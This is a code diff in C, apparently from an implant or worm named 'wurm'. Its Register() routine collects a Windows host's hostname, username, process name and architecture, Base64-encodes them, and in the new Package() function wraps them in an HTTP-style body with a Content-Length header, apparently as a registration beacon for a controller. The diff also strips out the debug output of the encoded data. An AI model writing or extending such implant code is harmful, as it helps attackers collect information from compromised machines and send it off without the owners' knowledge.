@@ -18,10 +18,10 @@ struct {
     struct {
         CHAR* status;
         CHAR* format;
-        //CHAR* buffer; // must be freed
+        CHAR* buffer; // must be freed
         CHAR* encode; // must be freed
-        //CHAR* length;
-        //DWORD size;
+        CHAR  length[MAX_PATH];
+        DWORD size;
     } data;
     struct {
         CHAR*   name; // must be freed
@@ -38,12 +38,35 @@ void Encode(CHAR* data_to_encode, DWORD data_to_encode_length) {
     wurm.data.encode = (CHAR*) malloc(encoded_data_length);
     
     CryptBinaryToStringA((BYTE *) data_to_encode, data_to_encode_length, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, wurm.data.encode, &encoded_data_length);
-
-    printf("Encoded data: %s\n ", wurm.data.encode);
 }
 
 void Package(CHAR* buffer) {
-    printf("%s",buffer);
+    // Set local variables
+    CHAR* carriage_return = "%s\r\n\r\n"; // Used as padding to send data
+    CHAR* content_length_header = "Content-Length: %lu\r\n"; // Used as a header format
+    DWORD dw_error = GetLastError();
+
+    // Allocate buffer and define variables for structure
+    DWORD package_length = strlen(buffer) + 5;
+    CHAR* package = (CHAR*) calloc(package_length, sizeof(CHAR));
+    sprintf_s(package, package_length, carriage_return, buffer);
+
+    // Set local variables to data structure
+    sprintf_s(wurm.data.length, MAX_PATH, content_length_header, package_length);
+    wurm.data.buffer = package;
+    wurm.data.size = package_length;
+
+    if (strcmp(wurm.data.buffer, "") == 0) {
+        printf("Error: %lu\n", dw_error);
+    } else {
+        printf("Allocated buffer: %s\n", wurm.data.buffer);
+    }
+
+    if (strcmp(wurm.data.length, "") == 0) {
+        printf("Error: %lu\n", dw_error);
+    } else {
+        printf("Header set: %s\n", wurm.data.length);
+    }
 
     // Clean up memory
     free(buffer);
@@ -125,7 +148,6 @@ void Register() {
 
     // Base-64 encode the allocated data structure 
     DWORD data_length = strlen(wurm.data.status) + strlen(wurm.info.hostname) + strlen(wurm.info.username) + 4 + strlen(wurm.info.name) + strlen(wurm.info.arch) + 2; // Add two null bytes
-    printf("%s\n", data_pointer);
     Encode(data_pointer, data_length);
 
     // Allocate buffer in data structure
@@ -136,6 +158,7 @@ void Register() {
     CloseHandle(snapshot);
     free(data_pointer);
     free(wurm.info.name); // Strdup requires variable to be freed
+    free(wurm.data.buffer); // Note: Move to request function once refactored
 }
 
 int main(int argc, char* argv[]) {
